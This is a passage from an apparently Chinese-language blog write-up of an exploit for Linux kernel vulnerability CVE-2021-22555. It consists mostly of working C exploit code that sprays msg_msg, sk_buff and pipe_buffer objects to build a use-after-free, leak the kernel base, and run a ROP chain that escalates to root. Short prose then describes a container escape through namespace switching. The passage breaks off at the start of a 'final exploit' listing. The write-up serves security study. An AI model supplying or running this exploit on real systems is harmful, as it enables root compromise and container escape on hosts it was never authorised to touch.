real_qid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg_prim</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">pipe_buf_ptr</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops_ptr</span>;</span><br>    <span class="hljs-type">uint64_t</span>    victim_addr;<br>    <span class="hljs-type">uint64_t</span>    kernel_base;<br>    <span class="hljs-type">uint64_t</span>    kernel_offset;<br>    <span class="hljs-type">uint64_t</span>    *rop_chain;<br>    <span class="hljs-type">int</span>         rop_idx;<br>    <span class="hljs-type">cpu_set_t</span>   cpu_set;<br><br>    saveStatus();<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.O</span><br><span class="hljs-comment">     * Initialization</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] CVE-2021-22555 Linux Privilege Escalation.\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// ident namespace</span><br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to unshare(CLONE_NEWUSER)&quot;</span>);<br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to unshare(CLONE_NEWNET)&quot;</span>);<br><br>    <span class="hljs-comment">// run the exp on specific core only</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-comment">// socket to trigert off-by-null</span><br>    <span class="hljs-keyword">if</span> ((socket_fd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to create socket!&quot;</span>);<br>    <br>    <span class="hljs-comment">// socket pairs to spray sk_buff</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sk_sockets[i]) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create socket pair!&quot;</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.I</span><br><span class="hljs-comment">     * build msg_queue, spray primary and secondary msg_msg,</span><br><span class="hljs-comment">     * and use OOB write to construct the overlapping</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Build message queue...&quot;</span>);<br>    <span class="hljs-comment">// build 4096 message queue</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(&amp;primary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(primary_msg));<br>    <span class="hljs-built_in">memset</span>(&amp;secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(secondary_msg));<br><br>    <span class="hljs-comment">// spray primary and secondary message</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, <br>                <span class="hljs-keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to send primary msg!&quot;</span>);<br><br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to send secondary msg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// create hole in primary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="hljs-number">1024</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (readMsg(msqid[i], &amp;primary_msg, <br>                <span class="hljs-keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to receive primary msg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// triger off-by-null on primary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Trigger OOB write to construct the overlapping...&quot;</span>);<br>    trigerOutOfBoundWrite(socket_fd);<br><br>    <span class="hljs-comment">// find the queues that have the same secondary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Checking whether succeeded to make overlapping...&quot;</span>);<br>    victim_qid = real_qid = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((i % <span class="hljs-number">1024</span>) == <span class="hljs-number">0</span>)  <span class="hljs-comment">// the hole</span><br>            <span class="hljs-keyword">continue</span>;<br><br>        <span class="hljs-keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error qid: %d\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">0</span>] != MSG_TAG)<br>            errExit(<span class="hljs-string">&quot;failed to make corruption!&quot;</span>);<br>        <br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>] != i)<br>        &#123;<br>            victim_qid = i;<br>            real_qid = *(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>];<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_qid &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to make overlapping!&quot;</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d \033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, <br>            victim_qid, real_qid);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.II</span><br><span class="hljs-comment">     * construct UAF</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// free the victim secondary msg_msg, then we get a UAF</span><br>    <span class="hljs-keyword">if</span> (readMsg(msqid[real_qid], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.III</span><br><span class="hljs-comment">     * spray sk_buff to leak msg_msg addr</span><br><span class="hljs-comment">     * construct fake msg_msg to leak addr of UAF obj</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// spray sk_buff to construct fake msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff...&quot;</span>);<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// use fake msg_msg to read OOB</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] OOB read from victim msg_msg&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br><br>    nearby_msg = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, <br>            nearby_msg-&gt;m_list.prev);<br><br>    <span class="hljs-comment">// release and re-spray sk_buff to construct fake msg_msg</span><br>    <span class="hljs-comment">// so that we can make an arbitrary read on a primary msg_msg</span><br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-keyword">sizeof</span>(oob_msg.mtext), <br>            nearby_msg-&gt;m_list.prev - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[<span class="hljs-number">0x1000</span>] != MSG_TAG)<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br>    <br>    <span class="hljs-comment">// cal the addr of UAF obj by the header we just read out</span><br>    nearby_msg_prim = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="hljs-number">0x400</span>;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, <br>            nearby_msg_prim-&gt;m_list.next);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.IV</span><br><span class="hljs-comment">     * fix the header of UAF obj and release it</span><br><span class="hljs-comment">     * spray pipe_buffer and leak the kernel base</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// re-construct the msg_msg to fix it</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">memset</span>(fake_secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(fake_secondary_msg));<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            victim_addr + <span class="hljs-number">0x800</span>, victim_addr + <span class="hljs-number">0x800</span>, <span class="hljs-comment">// a valid kheap addr is valid</span><br>            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// release UAF obj as secondary msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release UAF obj in message queue...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    <br>    <span class="hljs-comment">// spray pipe_buffer</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create pipe!&quot;</span>);<br>        <br>        <span class="hljs-comment">// write something to activate it</span><br>        <span class="hljs-keyword">if</span> (write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to write the pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// release the sk_buff to read pipe_buffer, leak kernel base</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (read(sk_sockets[i][<span class="hljs-number">1</span>], &amp;fake_secondary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>                errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>            <br>            <span class="hljs-keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="hljs-number">0xffffffff81000000</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, <br>                        pipe_buf_ptr-&gt;ops);<br>                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;<br>                kernel_base = <span class="hljs-number">0xffffffff81000000</span> + kernel_offset;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, <br>            kernel_base, kernel_offset);<br>    <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.V</span><br><span class="hljs-comment">     * hijack the ops of pipe_buffer</span><br><span class="hljs-comment">     * free all pipe to trigger fake ptr</span><br><span class="hljs-comment">     * so that we hijack the RIP</span><br><span class="hljs-comment">     * construct a ROP on pipe_buffer</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pre-construct data in userspace...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) fake_secondary_msg;<br>    pipe_buf_ptr-&gt;ops = victim_addr;<br><br>    ops_ptr = (<span class="hljs-keyword">struct</span> pipe_buf_operations *) fake_secondary_msg;<br>    ops_ptr-&gt;release = <span class="hljs-number">0xffffffff8183b4d3</span> + kernel_offset;<span class="hljs-comment">// push rsi ; pop rsp ; add [rbp-0x3d],bl ; ret</span><br>    ops_ptr-&gt;confirm = <span class="hljs-number">0xffffffff81689ea4</span> + kernel_offset;<span class="hljs-comment">// pop rdx ; pop r13 ; pop rbp ; ret</span><br><br>    rop_idx = <span class="hljs-number">0</span>;<br>    rop_chain = (<span class="hljs-type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="hljs-number">0x20</span>];<br>    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;<br>    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;<br>    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;<br>    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="hljs-number">22</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = getRootShell;<br>    rop_chain[rop_idx++] = user_cs;<br>    rop_chain[rop_idx++] = user_eflags;<br>    rop_chain[rop_idx++] = user_sp;<br>    rop_chain[rop_idx++] = user_ss;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++)<br>    &#123;<br>        close(pipe_fd[i][<span class="hljs-number">0</span>]);<br>        close(pipe_fd[i][<span class="hljs-number">1</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行即可完成提权</p><p><img src="https://s2.loli.net/2022/03/31/pwtTNfU3Xa1smzO.png" alt="image.png"></p><h2 id="容器逃逸"><a href="#容器逃逸" class="headerlink" title="容器逃逸"></a>容器逃逸</h2><h3 id="Step-VI-切换进程命名空间，完成容器逃逸"><a href="#Step-VI-切换进程命名空间，完成容器逃逸" class="headerlink" title="Step.VI 切换进程命名空间，完成容器逃逸"></a>Step.VI 切换进程命名空间，完成容器逃逸</h3><p>现在我们已经能够在内核空间进行 ROP 了，那么完成容器逃逸其实是顺水推舟的事情，容器常用的隔离手段是利用命名空间进行隔离，因此我们只需要在内核中将进程的命名空间切换为初始的全局命名空间 <code>init_nsproxy</code> 即可完成容器逃逸，执行<code>switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)</code> 即可替换掉当前进程的命名空间</p><h3 id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>整合了容器逃逸后的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span 